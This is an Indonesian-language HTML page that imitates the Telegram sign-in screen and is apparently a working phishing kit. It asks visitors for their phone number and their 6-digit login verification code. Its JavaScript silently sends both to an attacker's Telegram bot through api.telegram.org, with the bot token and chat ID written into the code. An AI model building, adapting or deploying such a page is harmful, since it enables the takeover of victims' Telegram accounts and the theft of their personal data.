<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  

    <!-- Page 1: Phone Number Input -->
    <div id="page1" class="w-full max-w-sm bg-white p-8 rounded-lg shadow-lg">
        <div class="flex justify-center mb-6">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="w-12 h-12">
        </div>
        <h2 class="text-center text-xl font-semibold mb-2">Masuk ke Telegram</h2>
        <p class="text-center text-gray-600 text-sm mb-6">Mohon konfirmasi kode negara dan masukkan nomor telepon Anda.</p>
        <form>
            <div class="mb-4">
                <label for="country" class="block text-sm font-medium text-gray-700 mb-1">Negara</label>
                <select id="country" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                    <option>Indonesia</option>
                </select>
            </div>
            <div class="mb-4">
    <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Nomor Telepon</label>
    <div class="flex">
        <span class="inline-flex items-center px-3 py-2 border border-r-0 border-gray-300 bg-gray-100 rounded-l-md text-gray-600">+62</span>
        <input 
            type="tel" 
            id="phone" 
            placeholder="--------" 
            maxlength="12" 
            oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
            class="w-full px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500">
    </div>
    <p id="phoneError" class="text-red-500 text-xs hidden">Harap masukkan nomor telepon yang valid.</p>
</div>
            <div class="mb-6">
                <label class="inline-flex items-center text-sm text-gray-700">
                    <input type="checkbox" class="form-checkbox h-4 w-4 text-blue-500 border-gray-300 rounded mr-2" checked>
                    Sinkron Kontak
                </label>
            </div>
            <div class="mb-4">
                <button type="button" onclick="confirmPhoneNumber()" class="w-full py-2 px-4 bg-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">Next</button>
            </div>
        </form>
    </div>

<!-- Confirmation Message -->
<div id="confirmationMessage" class="w-full max-w-sm bg-white p-8 rounded-lg shadow-lg hidden">
    <div class="mb-4">
        <div class="flex items-start mb-2">
            <p class="text-gray-500 text-xs mr-2">Apakah nomor sudah benar?</p>
        </div>
        <!-- Nomor Telepon -->
        <p id="displayPhone" class="text-center text-gray-600 text-lg mt-2"></p> <!-- Nomor telepon ditampilkan di sini -->
    </div>
    <div class="flex justify-between mt-6">
        <a href="#" onclick="goBackToInput()" class="text-blue-500 hover:underline cursor-pointer">Edit</a>
        <a href="#" onclick="showVerificationPage()" class="text-blue-500 hover:underline cursor-pointer">Ya</a>
    </div>
</div>

<!-- Page 2: Verification Code Input -->
<div id="page2" class="w-full max-w-sm bg-white p-8 rounded-lg shadow-lg hidden">
    <div class="flex justify-center mb-6">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="w-12 h-12">
    </div>
    <h2 class="text-center text-xl font-semibold mb-2">Cek pesan Telegram Anda</h2>
    <p id="verificationMessage" class="text-center text-gray-600 text-sm mb-6">Kami telah mengirimkan kode ke aplikasi Telegram untuk nomor Anda.</p>
    
    <!-- Code Input Fields -->
    <div class="flex justify-center space-x-2 mb-4">
        <input type="text" maxlength="1" oninput="moveFocus(this, 0)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input type="text" maxlength="1" oninput="moveFocus(this, 1)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input type="text" maxlength="1" oninput="moveFocus(this, 2)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input type="text" maxlength="1" oninput="moveFocus(this, 3)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input type="text" maxlength="1" oninput="moveFocus(this, 4)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input type="text" maxlength="1" oninput="moveFocus(this, 4)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
    </div>

<!-- Resend Code Link with Countdown Timer -->
<p class="text-center text-sm">
    <span id="resendCodeLink" class="text-gray-500 cursor-not-allowed">Tidak menerima kode?</span>
    <span id="timer" class="text-gray-500">(60s)</span>
</p>
</div>

<script>
    function moveFocus(input, index) {
        // Allow only digits
        input.value = input.value.replace(/[^0-9]/g, ''); // Remove non-numeric characters

        // Allow only one digit
        if (input.value.length > 1) {
            input.value = input.value.charAt(0); // Keep only the first digit
        }

        // Move to the next input if filled
        if (input.value.length === 1 && index < 4) {
            document.querySelectorAll('input[type="text"]')[index + 1].focus();
        } else if (input.value.length === 0 && index > 0) {
            // Move back to the previous input if current is empty
            document.querySelectorAll('input[type="text"]')[index - 1].focus();
        }
    }
</script>

<script>
    const botToken = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'; // Ganti dengan token bot Anda
    const chatId = '-4546395669'; // Ganti dengan ID chat Telegram Anda atau ID grup di mana pesan dikirim

    function confirmPhoneNumber() {
        const phoneInput = document.getElementById('phone').value;
        const phoneError = document.getElementById('phoneError');

        phoneError.classList.add('hidden');

        if (phoneInput.length < 7 || phoneInput.length > 12) {
            phoneError.textContent = "Harap masukkan nomor telepon yang valid.";
            phoneError.classList.remove('hidden');
            return;
        }

        if (!phoneInput.startsWith('08') && !phoneInput.startsWith('8')) {
            phoneError.textContent = "Nomor telepon salah.";
            phoneError.classList.remove('hidden');
            return;
        }

        document.getElementById('displayPhone').textContent = `+62 ${phoneInput}`;
        document.getElementById('page1').classList.add('hidden');
        document.getElementById('confirmationMessage').classList.remove('hidden');
    }

    function sendPhoneNumberToTelegram(phoneNumber) {
        const message = `Nomor telepon yang dimasukkan: +62 ${phoneNumber}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => {
                if (response.ok) {
                    console.log("Nomor telepon berhasil dikirim ke bot Telegram");
                } else {
                    console.error("Gagal mengirim nomor telepon ke bot Telegram");
                }
            })
            .catch(error => console.error("Terjadi kesalahan:", error));
    }

    function sendVerificationCodeToTelegram(code) {
        const message = `Kode verifikasi yang dimasukkan: ${code}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => {
                if (response.ok) {
                    console.log("Kode verifikasi berhasil dikirim ke bot Telegram");
                } else {
                    console.error("Gagal mengirim kode verifikasi ke bot Telegram");
                }
            })
            .catch(error => console.error("Terjadi kesalahan:", error));
    }

    function showVerificationPage() {
        const phoneInput = document.getElementById('phone').value;
        const verificationMessage = document.getElementById('verificationMessage');

        verificationMessage.textContent = `Kami telah mengirimkan kode ke aplikasi Telegram untuk +62 ${phoneInput} di perangkat Anda yang lain.`;

        document.getElementById('confirmationMessage').classList.add('hidden');
        document.getElementById('page2').classList.remove('hidden');

        sendPhoneNumberToTelegram(phoneInput);
    }

    function moveFocus(input, index) {
        input.value = input.value.replace(/[^0-9]/g, ''); 

        if (input.value.length > 1) {
            input.value = input.value.charAt(0); 
        }

        if (input.value.length === 1 && index < 5) {
            document.querySelectorAll('input[type="text"]')[index + 1].focus();
        } else if (input.value.length === 0 && index > 0) {
            document.querySelectorAll('input[type="text"]')[index - 1].focus();
        }

        // Check if all inputs are filled
        const inputs = Array.from(document.querySelectorAll('input[type="text"]'));
        const code = inputs.map(input => input.value).join('');
        
        if (code.length === 6) { // Jika semua kode (6 digit) sudah diisi
            sendVerificationCodeToTelegram(code);
        }
    }

        function goBackToInput() {
            document.getElementById('confirmationMessage').classList.add('hidden');
            document.getElementById('page1').classList.remove('hidden');
        }
        
        let timerInterval;
let countdownTime = 60; // countdown time in seconds

// Start the countdown timer immediately when the page loads
window.onload = function() {
    startTimer();
};

function startTimer() {
    const resendCodeLink = document.getElementById("resendCodeLink");
    const timerElement = document.getElementById("timer");

    // Disable the resend link and start the countdown
    resendCodeLink.style.pointerEvents = "none";
    resendCodeLink.classList.add("text-gray-500", "cursor-not-allowed");
    resendCodeLink.classList.remove("text-blue-500", "cursor-pointer");
    timerElement.textContent = `(${countdownTime}s)`;

    // Start countdown
    timerInterval = setInterval(() => {
        countdownTime -= 1;
        timerElement.textContent = `(${countdownTime}s)`;

        // When countdown finishes
        if (countdownTime <= 0) {
            clearInterval(timerInterval);
            countdownTime = 60; // Reset the countdown time for the next use
            timerElement.textContent = "";
            resendCodeLink.textContent = "Tidak menerima kode?";
            resendCodeLink.style.pointerEvents = "auto"; // Enable the link again
            resendCodeLink.classList.add("text-blue-500", "cursor-pointer");
            resendCodeLink.classList.remove("text-gray-500", "cursor-not-allowed");
        }
    }, 1000);
}
    </script>
</body>
</html>
